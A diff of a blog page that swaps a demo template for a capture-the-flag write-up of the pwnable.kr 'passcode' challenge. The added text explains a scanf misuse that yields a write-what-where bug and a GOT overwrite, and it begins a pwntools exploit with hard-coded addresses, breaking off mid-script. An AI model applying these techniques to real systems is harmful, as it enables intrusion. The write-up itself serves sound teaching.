@@ -2,7 +2,7 @@
 <html lang="en">
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes, viewport-fit=cover">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
 
     <title>Passcode - pwnable.kr - gracecondition</title>
@@ -12,9 +12,9 @@
 
     
     <meta property="og:type" content="article">
-    <meta property="og:url" content="http://localhost:1313/ctf/pwnable.kr/passcode/">
+    <meta property="og:url" content="http://192.168.1.101:1313/ctf/pwnable.kr/passcode/">
     <meta property="og:title" content="Passcode - pwnable.kr">
-    <meta property="og:description" content="Demo template for heap exploitation writeups - demonstrates proper formatting and structure.">
+    <meta property="og:description" content="Writeup of the pwnable passcode CTF Challenge">
     
     <meta property="og:image" content="https://pwnable.kr/img/passcode.png">
     
@@ -25,15 +25,15 @@
 
     
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:url" content="http://localhost:1313/ctf/pwnable.kr/passcode/">
+    <meta name="twitter:url" content="http://192.168.1.101:1313/ctf/pwnable.kr/passcode/">
     <meta name="twitter:title" content="Passcode - pwnable.kr">
-    <meta name="twitter:description" content="Demo template for heap exploitation writeups - demonstrates proper formatting and structure.">
+    <meta name="twitter:description" content="Writeup of the pwnable passcode CTF Challenge">
     
     <meta name="twitter:image" content="https://pwnable.kr/img/passcode.png">
     
 
     
-    <link rel="canonical" href="http://localhost:1313/ctf/pwnable.kr/passcode/">
+    <link rel="canonical" href="http://192.168.1.101:1313/ctf/pwnable.kr/passcode/">
 
     
     <script type="application/ld+json">
@@ -42,7 +42,7 @@
         "@type": "BlogPosting",
         
         "headline": "Passcode - pwnable.kr",
-        "description": "Demo template for heap exploitation writeups - demonstrates proper formatting and structure.",
+        "description": "Writeup of the pwnable passcode CTF Challenge",
         "author": {
             "@type": "Person",
             "name": "gracecondition"
@@ -55,21 +55,21 @@
         "publisher": {
             "@type": "Organization",
             "name": "gracecondition",
-            "url": "http:\/\/localhost:1313\/"
+            "url": "http:\/\/192.168.1.101:1313\/"
         },
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "http:\/\/localhost:1313\/ctf\/pwnable.kr\/passcode\/"
+            "@id": "http:\/\/192.168.1.101:1313\/ctf\/pwnable.kr\/passcode\/"
         }
         
     }
     </script>
 
-    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
+    <link rel="stylesheet" href="http://192.168.1.101:1313/css/style.css">
     <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
 
     
-    <link rel="icon" href="http://localhost:1313/favicon.png">
+    <link rel="icon" href="http://192.168.1.101:1313/favicon.png">
     
 
     
@@ -80,12 +80,12 @@
         <header class="site-header">
     <nav class="navbar">
         <div class="nav-container">
-            <a href="http://localhost:1313/" class="nav-brand">
+            <a href="http://192.168.1.101:1313/" class="nav-brand">
                 <h1>gracecondition</h1>
             </a>
 
             <div class="nav-menu" id="nav-menu">
-                <a href="http://localhost:1313/" class="nav-link">Home</a>
+                <a href="http://192.168.1.101:1313/" class="nav-link">Home</a>
                 <a href="/posts/" class="nav-link">Posts</a>
                 <a href="/ctf/" class="nav-link">CTF Solutions</a>
                 <a href="/about/" class="nav-link">About</a>
@@ -113,21 +113,27 @@
                 
                 <nav id="TableOfContents">
   <ul>
-    <li><a href="#demo-heap-challenge---demo-ctf">Demo Heap Challenge - Demo CTF</a>
+    <li><a href="#passcode---pwnablekr">Passcode - Pwnable.kr</a>
       <ul>
-        <li><a href="#challenge-description">Challenge Description</a></li>
-        <li><a href="#initial-analysis">Initial Analysis</a></li>
-        <li><a href="#static-analysis">Static Analysis</a>
+        <li><a href="#understanding-the-mitigations">Understanding the Mitigations</a></li>
+        <li><a href="#reading-the-source-code">Reading the source code</a>
           <ul>
-            <li><a href="#allocate_chunk">allocate_chunk()</a></li>
-            <li><a href="#free_chunk">free_chunk()</a></li>
+            <li><a href="#the-bugs-in-the-source-code">The bugs in the source code</a>
+              <ul>
+                <li><a href="#incorrect-usage-of-scanf">Incorrect usage of scanf()</a></li>
+              </ul>
+            </li>
+            <li><a href="#uninitialized-data-usage">Uninitialized Data Usage</a></li>
+            <li><a href="#write-what-were">Write what were</a></li>
           </ul>
         </li>
-        <li><a href="#vulnerability-analysis">Vulnerability Analysis</a></li>
-        <li><a href="#exploitation-strategy">Exploitation Strategy</a></li>
-        <li><a href="#exploitation-implementation">Exploitation Implementation</a></li>
-        <li><a href="#key-insights">Key Insights</a></li>
-        <li><a href="#mitigation">Mitigation</a></li>
+        <li><a href="#exploitation">Exploitation</a>
+          <ul>
+            <li><a href="#finding-the-offsets">Finding the offsets</a></li>
+            <li><a href="#finding-the-necessary-addresses">Finding the necessary addresses:</a></li>
+            <li><a href="#final-exploit-source-code">Final exploit source code</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
@@ -153,7 +159,7 @@
                 
                 <div class="info-item">
                     <span class="info-label">Words:</span>
-                    <span class="info-value">532</span>
+                    <span class="info-value">622</span>
                 </div>
                 
                 
@@ -177,19 +183,19 @@
                 
                 <div class="info-item">
                     <span class="info-label">Points:</span>
-                    <span class="info-value">450</span>
+                    <span class="info-value">20</span>
                 </div>
                 
                 
                 <div class="info-item">
                     <span class="info-label">Solves:</span>
-                    <span class="info-value">12</span>
+                    <span class="info-value">350</span>
                 </div>
                 
                 
                 <div class="info-item">
                     <span class="info-label">CTF:</span>
-                    <span class="info-value">Demo CTF</span>
+                    <span class="info-value">pwnable.kr</span>
                 </div>
                 
             </div>
@@ -202,11 +208,11 @@
             <h4 class="toc-subtitle">Tags</h4>
             <div class="toc-tags">
                 
-                <a href="/tags/demo/" class="toc-tag">#demo</a>
+                <a href="/tags/pwnable/" class="toc-tag">#pwnable</a>
                 
-                <a href="/tags/template/" class="toc-tag">#template</a>
+                <a href="/tags/ctf/" class="toc-tag">#CTF</a>
                 
-                <a href="/tags/heap-exploitation/" class="toc-tag">#heap-exploitation</a>
+                <a href="/tags/write-what-where/" class="toc-tag">#Write-What-Where</a>
                 
             </div>
         </div>
@@ -232,45 +238,6 @@
             <div class="related-posts">
                 
                 
-                <article class="related-post">
-                    <a href="http://localhost:1313/ctf/plaidctf-2024/vm-escape/" class="related-post-link">
-                        <span class="related-post-icon">
-                            🚩
-                            
-                        </span>
-                        <div class="related-post-content">
-                            <h5 class="related-post-title">Demo VM Escape Challenge</h5>
-                            <time class="related-post-date">Jan 25</time>
-                        </div>
-                    </a>
-                </article>
-                
-                <article class="related-post">
-                    <a href="http://localhost:1313/ctf/pwnable.kr/kernel-nightmare/" class="related-post-link">
-                        <span class="related-post-icon">
-                            🚩
-                            
-                        </span>
-                        <div class="related-post-content">
-                            <h5 class="related-post-title">Demo Kernel Challenge</h5>
-                            <time class="related-post-date">Jan 20</time>
-                        </div>
-                    </a>
-                </article>
-                
-                <article class="related-post">
-                    <a href="http://localhost:1313/posts/linux-kernel-heap-exploitation/" class="related-post-link">
-                        <span class="related-post-icon">
-                            🔬
-                            
-                        </span>
-                        <div class="related-post-content">
-                            <h5 class="related-post-title">Demo Advanced Research - Kernel Exploitation</h5>
-                            <time class="related-post-date">Jan 18</time>
-                        </div>
-                    </a>
-                </article>
-                
             </div>
         </div>
 
@@ -282,7 +249,7 @@
             <div class="ctf-meta">
                 <span class="ctf-badge">🚩 CTF Writeup</span>
                 
-                <span class="ctf-name">Demo CTF</span>
+                <span class="ctf-name">pwnable.kr</span>
                 
             </div>
 
@@ -299,13 +266,13 @@
                     
                     <div class="stat-item">
                         <span class="stat-label">Points:</span>
-                        <span class="stat-value">450</span>
+                        <span class="stat-value">20</span>
                     </div>
                     
                     
                     <div class="stat-item">
                         <span class="stat-label">Solves:</span>
-                        <span class="stat-value">12</span>
+                        <span class="stat-value">350</span>
                     </div>
                     
                     
@@ -321,189 +288,140 @@
         </header>
 
         <div class="post-body ctf-content" id="post-content">
-            <h1 id="demo-heap-challenge---demo-ctf">Demo Heap Challenge - Demo CTF</h1>
-<p><strong>Category</strong>: pwn
-<strong>Points</strong>: 450
-<strong>Solves</strong>: 12</p>
-<p><em>This is a demo template showing the proper structure for CTF writeups.</em></p>
-<h2 id="challenge-description">Challenge Description</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[Challenge description from CTF organizers would go here]
+            <h1 id="passcode---pwnablekr">Passcode - Pwnable.kr</h1>
+<h2 id="understanding-the-mitigations">Understanding the Mitigations</h2>
+<p>The challenge description is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Mommy told me to make a passcode based login system.
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>nc challenge.example.com 31337
-</span></span></code></pre></div><p><strong>Files</strong>: <code>binary_name</code>, <code>libc.so.6</code></p>
-<h2 id="initial-analysis">Initial Analysis</h2>
-<p>Binary checksec and basic reconnaissance:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file binary_name
-</span></span><span style="display:flex;"><span>binary_name: ELF 64-bit LSB executable, x86-64, dynamically linked
+</span></span><span style="display:flex;"><span>My initial C code was compiled without any error!
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$ checksec binary_name
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/path/to/binary_name&#39;</span>
-</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
-</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
-</span></span><span style="display:flex;"><span>    Stack:    Canary found
-</span></span><span style="display:flex;"><span>    NX:       NX enabled
-</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
-</span></span></code></pre></div><h2 id="static-analysis">Static Analysis</h2>
-<p>Decompiled pseudocode from Ghidra/IDA would go here:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setup</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Welcome to the challenge!&#34;</span>);
+</span></span><span style="display:flex;"><span>Well, there was some compiler warning, but who cares about that?
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">menu</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> choice <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_int</span>();
+</span></span><span style="display:flex;"><span>ssh passcode@pwnable.kr -p2222 (pw:guest)
+</span></span></code></pre></div><p>Were given two files, the binary itself, and the source code.</p>
+<p>Running this through my tool, <a href="https://github.com/gracecondition/elfsec">elfsec</a>:
+<figure><img src="/images/passcode/screenshot1.png" width="100%">
+</figure>
+</p>
+<p>PIE is disabled, but other than that, all common mitigations are on.</p>
+<h2 id="reading-the-source-code">Reading the source code</h2>
+<p>Heres <code>passcode.c</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> passcode1;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> passcode2;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (choice) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">allocate_chunk</span>(); <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">free_chunk</span>(); <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">edit_chunk</span>(); <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">view_chunk</span>(); <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>); <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid choice&#34;</span>); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;enter passcode1 : &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, passcode1);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fflush</span>(stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;enter passcode2 : &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, passcode2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;checking...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(passcode1<span style="color:#f92672">==</span><span style="color:#ae81ff">123456</span> <span style="color:#f92672">&amp;&amp;</span> passcode2<span style="color:#f92672">==</span><span style="color:#ae81ff">13371337</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Login OK!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">setregid</span>(<span style="color:#a6e22e">getegid</span>(), <span style="color:#a6e22e">getegid</span>());
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/cat flag&#34;</span>);
 </span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Login Failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Key functions analysis:</p>
-<h3 id="allocate_chunk">allocate_chunk()</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">allocate_chunk</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_index</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Function implementation details
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
-</span></span></code></pre></div><h3 id="free_chunk">free_chunk()</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">free_chunk</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_index</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Function implementation with potential bug
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
-</span></span></code></pre></div><h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
-<p>Description of the vulnerability found:</p>
-<ul>
-<li><strong>Vulnerability Type</strong>: (e.g., Use-After-Free, Buffer Overflow, Double-Free)</li>
-<li><strong>Location</strong>: Where it occurs in the code</li>
-<li><strong>Primitives</strong>: What capabilities it provides (arbitrary read/write, info leak, etc.)</li>
-</ul>
-<p>Example vulnerability description:</p>
-<ol>
-<li>The vulnerability allows editing freed chunks</li>
-<li>This leads to heap metadata corruption</li>
-<li>Can achieve arbitrary write primitive</li>
-</ol>
-<h2 id="exploitation-strategy">Exploitation Strategy</h2>
-<p>High-level exploitation plan:</p>
-<ol>
-<li><strong>Leak libc addresses</strong> using unsorted bin or other technique</li>
-<li><strong>Gain primitive</strong> through tcache/fastbin poisoning or similar</li>
-<li><strong>Overwrite target</strong> such as <code>__free_hook</code> or <code>__malloc_hook</code></li>
-<li><strong>Trigger shell</strong> by executing system(&quot;/bin/sh&quot;) or equivalent</li>
-</ol>
-<h2 id="exploitation-implementation">Exploitation Implementation</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup</span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">welcome</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;enter you name : &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%100s&#34;</span>, name);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Welcome %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+</span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connection</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
-</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;challenge.example.com&#39;</span>, <span style="color:#ae81ff">31337</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./binary_name&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Toddler&#39;s Secure Login System 1.1 beta.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Helper functions</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">allocate</span>(idx, size):
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">welcome</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">login</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// something after login...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Now I can safely trust you that you have credential :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;	
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="the-bugs-in-the-source-code">The bugs in the source code</h3>
+<h4 id="incorrect-usage-of-scanf">Incorrect usage of scanf()</h4>
+<p>The value that is passed into scanf needs to be a pointer to a variable.
+More specifically, the correct way to pass a variable to scanf is using the <code>&amp;</code> symbol since its expecting a pointer.</p>
+<h3 id="uninitialized-data-usage">Uninitialized Data Usage</h3>
+<p>Due to the way scanf is being used, and the variables its reading from <code>passcode1</code> &amp; <code>passcode2</code> being unitialized,
+we have an Uninitialized Data Access (UDA) bug.
+This means that scanf is going to fetch random data from the stack at the stack offset of passcode1 and passcode2.</p>
+<h3 id="write-what-were">Write what were</h3>
+<p>When the first scanf happens, its going to write whatever we give it, to whatever happened to be in the stack at the memory address
+<code>passcode1</code> points to.</p>
+<p>It helps to think of scanf like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">scanf</span>(stdin, <span style="color:#e6db74">&#34;%d&#34;</span>, passcode1);
+</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
+<h3 id="finding-the-offsets">Finding the offsets</h3>
+<p>Using pwndbg, I found the following offset:</p>
+<figure><img src="/images/passcode/screenshot2.png" width="100%">
+</figure>
+
+<p>From this we can gather that I can set values in the <code>eax</code> register, and the <code>edx</code> register,
+which further coroborates that there is an arbitrary write bug here.</p>
+<h3 id="finding-the-necessary-addresses">Finding the necessary addresses:</h3>
+<p>For this exploit, im thinking of overwriting the Global Offset Table (GOT), a table where external functions are linked to at runtime.
+Since this binary is only partial relro, the global offset table is writeable.
+If you have no clue what any of that means, please read me other <a href="http://gracecondition.github.io/posts/machsec-documentation/">blogpost</a>
+But put simply, this is a table that contains the addresses of external functions. If we overwrite one of this table&rsquo;s functions address,
+the next time that specific function is called, our own code will be run instead.
+on the various kinds of mitigations available on modern Unix based operating systems.</p>
+<p>First, we need to find where a function we want to overwrite is located on the global offset table:
+This can be done rather easily with IDA Pro, or pwndbg. To each their own.</p>
+<figure><img src="/images/passcode/screenshot3.png" width="100%">
+</figure>
+
+<p>Now we also need to figure out where we need to redirect code execution.</p>
+<p>Looking at it in IDA, again:
+<figure><img src="/images/passcode/screenshot4.png" width="100%">
+</figure>
+</p>
+<p>The reason we are jumping to this specific section of the code, is because we need to have the two calls that set permissions properly
+in order for the binary to have sufficient permissions to read the flag.</p>
+<h3 id="final-exploit-source-code">Final exploit source code</h3>
+<p>Using pwntools, I devised the following exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, data):
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>, data)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./passcode&#39;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i386&#39;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>fflush_got     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804C014</span>
+</span></span><span style="display:flex;"><span>system_gadget  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080492A1</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">96</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Leak libc base</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 1: Leaking libc base address&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SSH connection (this is the only correct way)</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> ssh(user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;passcode&#39;</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pwnable.kr&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">2222</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>process(<span style="color:#e6db74">&#39;./passcode&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create chunks for leak</span>
